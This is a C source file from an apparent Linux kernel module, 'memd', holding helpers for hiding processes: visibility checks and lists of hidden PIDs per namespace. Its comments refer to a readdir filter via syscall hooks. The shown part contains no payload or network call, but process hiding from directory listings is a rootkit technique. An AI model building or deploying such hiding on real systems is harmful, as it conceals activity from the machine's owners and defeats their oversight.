#include "memd_proc.h"
#include "memd_hide.h"

#include <linux/rcupdate.h>

int is_invisible(pid_t pid) {
    /* PF_INVISIBLE was an Android-specific task flag; normal Linux
     * kernels do not define it, so querying task->flags for that bit
     * would misclassify unrelated flags. Fail soft: report not
     * invisible on kernels where the concept does not exist. */
    (void)pid;
    return 0;
}

bool memd_hide_check_visibility(pid_t pid, struct pid_namespace *ns)
 {
    /* NULL ns keeps the historical &init_pid_ns default: this helper
     * stays init-scoped on purpose (backward compat). Non-init
     * reader-plane callers must pass the reader's active ns
     * explicitly; the readdir filter already does (see
     * memd_syshook.h), so no change is needed here. */
    if (!ns)
        ns = &init_pid_ns;
    return memd_hide_contains_ns(pid, ns);
}

int memd_hide_get_hidden_pids(pid_t *buf, size_t buf_size, size_t *count)
 {
    return memd_hide_collect_pids(buf, buf_size, count, NULL);
}

int memd_hide_get_ns_hidden_pids(pid_t *buf, size_t buf_size, size_t *count, struct pid_namespace *ns)
 {
    if (!ns)
        return -EINVAL;
    return memd_hide_collect_pids(buf, buf_size, count, ns);
}
/* kmod/memd/proc/memd_proc.c[∂] */
